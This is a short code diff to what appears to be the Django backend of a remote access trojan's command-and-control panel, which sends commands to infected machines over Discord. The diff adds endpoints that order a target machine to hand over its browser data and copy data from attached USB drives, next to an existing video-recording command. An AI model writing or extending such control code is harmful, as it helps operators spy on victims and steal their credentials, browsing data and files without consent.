@@ -226,3 +226,15 @@ def video_record(request, target_uuid, record_time):
     command = f"!video_record {record_time}"
     __send_discord_command(target_uuid, command)
     return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
+
+@api_view(['GET'])
+def get_browser_data(request, target_uuid):
+    command = f"!get_browser_data"
+    __send_discord_command(target_uuid, command)
+    return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
+
+@api_view(['GET'])
+def copy_usb_data(request, target_uuid):
+    command = f"!copy_usb_data"
+    __send_discord_command(target_uuid, command)
+    return JsonResponse({'channel': target_uuid, 'command': command}, safe=False)
